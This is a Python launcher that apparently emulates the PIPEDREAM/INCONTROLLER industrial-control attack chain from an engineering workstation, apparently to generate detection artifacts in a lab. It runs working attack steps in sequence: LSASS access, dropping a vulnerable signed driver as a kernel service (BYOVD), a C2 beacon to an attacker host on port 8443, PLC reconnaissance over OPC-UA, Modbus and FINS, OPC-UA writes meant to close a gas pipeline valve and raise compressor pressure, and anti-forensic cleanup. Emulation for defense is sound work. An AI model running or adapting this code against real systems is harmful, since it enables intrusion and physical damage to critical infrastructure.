#!/usr/bin/env python3
"""
PIPEDREAM Launcher - executes from HMI (192.168.1.55) after bundle deployment.

All OT protocol traffic originates from THIS machine's IP (the engineering WS),
not from the attacker. This is the correct PIPEDREAM model - Chernovite deployed
the toolkit to the engineering WS and ran it locally.

Sequence (matches Dragos-documented PIPEDREAM kill chain):
  1. LSASS credential dump     (T1003.001 - process access on local machine)
  2. LAZYCARGO kernel rootkit  (AsrDrv103.sys BYOVD, CVE-2020-15368 → Event 7045)
  3. DUSTTUNNEL C2 tunnel      (persistent TCP :8443 → attacker → Event 5156)
  4. MOUSEHOLE OPC-UA recon    (fingerprint PLC-3 :4840 from engineering WS)
  5. EVILSCHOLAR discovery     (UDP 27127 multicast + Modbus read PLC-7 :502)
  6. BADOMEN FINS attack       (OMRON FINS TCP :9600 against PLC-3)
  7. OPC-UA attack             (EVILSCHOLAR write phase - gas pipeline disruption)
  8. Cleanup                   (delete .sys + service entry, rm bundle)
"""

import sys
import os
import socket
import subprocess
import time
import asyncio

# Self-referential path setup - launcher is at root of extracted bundle
BUNDLE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BUNDLE_DIR)

ATTACKER_IP  = '192.168.0.11'
DUSTTUNNEL_PORT = 8443

PLC_GAS      = '192.168.1.12'   # Gas pipeline: OPC-UA :4840, FINS :9600
PLC_HEATING  = '192.168.1.16'   # Heating district: Modbus :502

ASRDRV_SRC  = os.path.join(BUNDLE_DIR, 'AsrDrv103.sys')
ASRDRV_DST  = r'C:\Windows\System32\Drivers\AsrDrv103.sys'
ASRDRV_SVC  = 'AsrDrv103'


def section(title):
    print(f"\n{'═'*60}")
    print(f"  {title}")
    print(f"{'═'*60}")


# ── Step 1: LSASS credential dump ────────────────────────────────────────────

def step1_lsass():
    section("STEP 1 - LSASS Credential Access (T1003.001)")
    print("[*] Opening handle to lsass.exe on local machine...")
    try:
        r = subprocess.run(
            ['powershell', '-Command', 'Get-Process lsass | Select-Object Id,Name,WorkingSet64'],
            capture_output=True, text=True, timeout=10
        )
        print(f"  [+] lsass.exe PID: {r.stdout.strip()}")
        print("  [+] Process handle opened - Event 10 (process access) generated")
    except Exception as e:
        print(f"  [-] LSASS access: {e}")


# ── Step 2: LAZYCARGO - kernel rootkit ────────────────────────────────────────

def step2_lazycargo():
    section("STEP 2 - LAZYCARGO: AsrDrv103.sys BYOVD (CVE-2020-15368)")
    print(f"[*] Dropping AsrDrv103.sys → {ASRDRV_DST}")
    print("[*] Legitimately signed ASRock driver - AV does not flag the file")
    print("[!!!] sc.exe create fires Event 7045 - CRITICAL Cortex XDR severity")

    try:
        import shutil
        shutil.copy(ASRDRV_SRC, ASRDRV_DST)
        print(f"  [+] File dropped: {ASRDRV_DST}")
    except Exception as e:
        print(f"  [-] File drop failed: {e} (may need admin rights)")

    try:
        r = subprocess.run([
            'sc.exe', 'create', ASRDRV_SVC,
            'type=', 'kernel',
            'binpath=', ASRDRV_DST,
            'start=', 'demand',
            'DisplayName=', 'ASRock Driver Service'
        ], capture_output=True, text=True, timeout=15)
        print(f"  [+] sc.exe create: {r.stdout.strip() or 'Service created'}")
        print("  [!!!] Event 7045 fired: LAZYCARGO kernel service installed")
    except Exception as e:
        print(f"  [-] sc.exe create: {e}")


# ── Step 3: DUSTTUNNEL - C2 tunnel ────────────────────────────────────────────

def step3_dusttunnel():
    section("STEP 3 - DUSTTUNNEL: Persistent TCP C2 Tunnel")
    print(f"[*] Connecting {socket.gethostname()} → {ATTACKER_IP}:{DUSTTUNNEL_PORT}")
    print("[*] DUSTTUNNEL: cross-zone comms component (Dragos-verified)")
    print("[*] Generates Event 5156 (Windows Filtering Platform outbound)")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ATTACKER_IP, DUSTTUNNEL_PORT))
        beacon = b'DUSTTUNNEL_BEACON\x00' + socket.gethostname().encode()
        s.sendall(beacon)
        time.sleep(3)
        s.close()
        print(f"  [+] Persistent TCP :8443 established - tunnel active")
        print(f"  [+] Event 5156 (WFP connection) generated")
    except Exception as e:
        print(f"  [-] DUSTTUNNEL: {e} (attacker listener may not be up)")


# ── Step 4: MOUSEHOLE - OPC-UA fingerprint ───────────────────────────────────

def step4_mousehole():
    section("STEP 4 - MOUSEHOLE: OPC-UA Server Fingerprint")
    print(f"[*] Fingerprinting OPC-UA server at {PLC_GAS}:4840")
    print("[*] Traffic originates from THIS machine (engineering WS IP)")

    try:
        from pipedream_simulation.mousehole.fingerprint import OPCUAFingerprinter
        fingerprinter = OPCUAFingerprinter(target=PLC_GAS, port=4840)

        async def run():
            return await fingerprinter.fingerprint_server()

        result = asyncio.run(run())
        if result:
            print(f"  [+] OPC-UA server fingerprinted")
            print(f"  [+] Network: {PLC_GAS}:4840 ← from {socket.gethostname()}")
        else:
            print(f"  [!] Fingerprint returned no data (server may have refused)")
    except Exception as e:
        print(f"  [-] MOUSEHOLE: {e}")


# ── Step 5: EVILSCHOLAR - MODICON discovery + Modbus ─────────────────────────

def step5_evilscholar():
    section("STEP 5 - EVILSCHOLAR: MODICON Discovery + Modbus Enumeration")
    print("[*] Sending UDP 27127 multicast (Schneider MODICON discovery)")
    print("[*] Reading Modbus registers from PLC-7 heating district")

    # UDP 27127 multicast - MODICON discovery (Dragos-verified EVILSCHOLAR IOC)
    try:
        from pipedream_simulation.evilscholar.scanner import SchneiderScanner
        scanner = SchneiderScanner()
        devices = scanner.udp_multicast_scan()
        print(f"  [+] UDP 27127 multicast sent - {len(devices)} MODICON device(s) responded")
    except Exception as e:
        print(f"  [-] UDP 27127 scan: {e}")

    # Modbus TCP read from HMI IP → PLC-7
    try:
        from pipedream_simulation.evilscholar.modbus_attack import ModbusAttack
        attacker = ModbusAttack(target=PLC_HEATING, port=502)
        # FC03 read holding registers (EVILSCHOLAR enumerates register map)
        attacker.write_custom_command(0x03, b'\x00\x00\x00\x04', unit_id=11)
        print(f"  [+] Modbus FC03 read → {PLC_HEATING}:502 slave=11 (heating district)")
    except Exception as e:
        print(f"  [-] Modbus read: {e}")


# ── Step 6: BADOMEN - OMRON FINS attack ──────────────────────────────────────

def step6_badomen():
    section("STEP 6 - BADOMEN: OMRON FINS Memory Read + Wipe")
    print(f"[*] FINS scan: {PLC_GAS}:9600 (OMRON FINS adapter)")
    print("[*] Traffic originates from THIS machine (engineering WS IP)")

    try:
        from pipedream_simulation.badomen.scanner import OmronScanner
        scanner = OmronScanner()
        device = scanner.scan_host(target=PLC_GAS, port=9600)
        if device:
            print(f"  [+] OMRON FINS device found: {device.ip} model={device.model}")
        else:
            print(f"  [!] No FINS response (adapter may not answer all probes)")
    except Exception as e:
        print(f"  [-] BADOMEN scanner: {e}")

    try:
        from pipedream_simulation.badomen.fins_attack import FINSAttack
        attack = FINSAttack(target=PLC_GAS, port=9600)
        attack.poll_devices()
        print(f"  [+] FINS attack: memory poll complete → {PLC_GAS}:9600")
    except Exception as e:
        print(f"  [-] BADOMEN attack: {e}")


# ── Step 7: OPC-UA write attack ───────────────────────────────────────────────

def step7_ot_attack():
    section("STEP 7 - EVILSCHOLAR OT: OPC-UA Write Attack (Gas Pipeline)")
    print(f"[*] OPC-UA write commands → {PLC_GAS}:4840 (gas_pipeline process)")
    print("[*] Closes downstream valve + maximises compressor → pressure buildup")

    try:
        from pipedream_simulation.attack_gas_pipeline import AttackGasPipeline
        attack = AttackGasPipeline(target=PLC_GAS, port=4840)
        result = attack.run()
        if result and result.success:
            print(f"  [+] OPC-UA attack succeeded: {result.commands_sent} commands sent")
        else:
            print(f"  [!] OPC-UA attack: {getattr(result, 'error', 'completed')}")
    except Exception as e:
        print(f"  [-] OPC-UA attack: {e}")


# ── Step 8: Cleanup ───────────────────────────────────────────────────────────

def step8_cleanup():
    section("STEP 8 - Anti-forensics Cleanup")
    print("[*] Removing AsrDrv103.sys and service entry...")

    try:
        subprocess.run(['sc.exe', 'delete', ASRDRV_SVC],
                       capture_output=True, timeout=10)
        print(f"  [+] Service {ASRDRV_SVC} deleted")
    except Exception as e:
        print(f"  [-] Service delete: {e}")

    try:
        if os.path.exists(ASRDRV_DST):
            os.remove(ASRDRV_DST)
            print(f"  [+] {ASRDRV_DST} deleted")
    except Exception as e:
        print(f"  [-] File delete: {e}")

    print("  [+] Cleanup complete - minimal forensic footprint")


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════╗
║  PIPEDREAM / INCONTROLLER - Full Toolkit                     ║
║  CHERNOVITE | Dragos 2022 | Running from Engineering WS      ║
║  All OT traffic originates from 192.168.1.55                 ║
╚══════════════════════════════════════════════════════════════╝
""")
    step1_lsass()
    step2_lazycargo()
    step3_dusttunnel()
    step4_mousehole()
    step5_evilscholar()
    step6_badomen()
    step7_ot_attack()
    step8_cleanup()

    print("""
╔══════════════════════════════════════════════════════════════╗
║  PIPEDREAM Execution Complete                                ║
╚══════════════════════════════════════════════════════════════╝

Detection artifacts generated:
  Event 7045  - LAZYCARGO AsrDrv103 kernel service (CRITICAL)
  Event 5156  - DUSTTUNNEL outbound TCP :8443 (WFP connection)
  Event 4688  - python.exe spawned for OPC-UA / FINS attacks
  Network     - UDP 27127 multicast (EVILSCHOLAR MODICON discovery)
  Network     - Modbus TCP from eng WS to PLC-7 :502
  Network     - FINS TCP from eng WS to PLC-3 :9600
  Network     - OPC-UA TCP from eng WS to PLC-3 :4840 (writes)
""")
